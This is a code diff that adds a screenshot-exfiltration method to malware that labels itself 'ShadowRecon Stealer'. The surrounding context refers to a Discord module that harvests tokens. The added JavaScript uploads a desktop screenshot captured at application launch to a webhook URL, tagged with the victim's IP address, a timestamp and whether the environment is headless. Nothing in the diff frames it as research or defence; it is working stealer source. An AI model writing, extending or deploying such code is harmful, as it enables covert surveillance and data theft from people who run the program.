@@ -653,6 +653,85 @@ This file indicates that the Discord module found tokens but couldn't process th
             throw new NetworkError(`Failed to send file to webhook: ${error.message}`);
         }
     }
+
+    /**
+     * Send screenshot to webhook
+     * @param {string} screenshotPath - Path to screenshot file
+     * @param {string} ip - IP address for context
+     * @returns {Promise<boolean>} Success status
+     */
+    async sendScreenshot(screenshotPath, ip = 'Unknown') {
+        try {
+            if (!screenshotPath || !fs.existsSync(screenshotPath)) {
+                logger.warn('Screenshot file not found or invalid path');
+                return false;
+            }
+
+            const FormData = require('form-data');
+            const formData = new FormData();
+
+            // Check if it's a placeholder text file or actual screenshot
+            const isPlaceholder = screenshotPath.includes('placeholder') || screenshotPath.endsWith('.txt');
+            const fileType = isPlaceholder ? 'report' : 'screenshot';
+
+            // Create a simple embed for the screenshot
+            const embed = {
+                title: isPlaceholder ? "📄 Screenshot Report" : "🖥️ Desktop Screenshot",
+                color: isPlaceholder ? 0xff9900 : 0x2f3136,
+                description: isPlaceholder ? 
+                    "Screenshot capture report (display not available)" : 
+                    "Screenshot captured at application launch",
+                fields: [
+                    {
+                        name: ":earth_africa: IP Address",
+                        value: `\`${ip}\``,
+                        inline: true
+                    },
+                    {
+                        name: ":clock1: Timestamp",
+                        value: `\`${new Date().toISOString()}\``,
+                        inline: true
+                    },
+                    {
+                        name: ":gear: Status",
+                        value: isPlaceholder ? "`Headless Environment`" : "`Screenshot Captured`",
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: "ShadowRecon Stealer - Screenshot Module"
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            const contentMessage = isPlaceholder ? 
+                "📄 **Screenshot Report** (headless environment detected)" :
+                "📸 **Screenshot captured at launch**";
+
+            formData.append('payload_json', JSON.stringify({ 
+                content: contentMessage,
+                embeds: [embed] 
+            }));
+            formData.append('file', fs.createReadStream(screenshotPath));
+
+            const response = await axios.post(this.webhookUrl, formData, {
+                headers: {
+                    ...formData.getHeaders()
+                },
+                timeout: this.timeout
+            });
+
+            logger.info(`Screenshot ${fileType} sent to webhook successfully`, { 
+                file: screenshotPath, 
+                status: response.status,
+                type: fileType
+            });
+            return true;
+        } catch (error) {
+            ErrorHandler.handle(error, null, { screenshotPath });
+            return false;
+        }
+    }
 }
 
 // Export the module
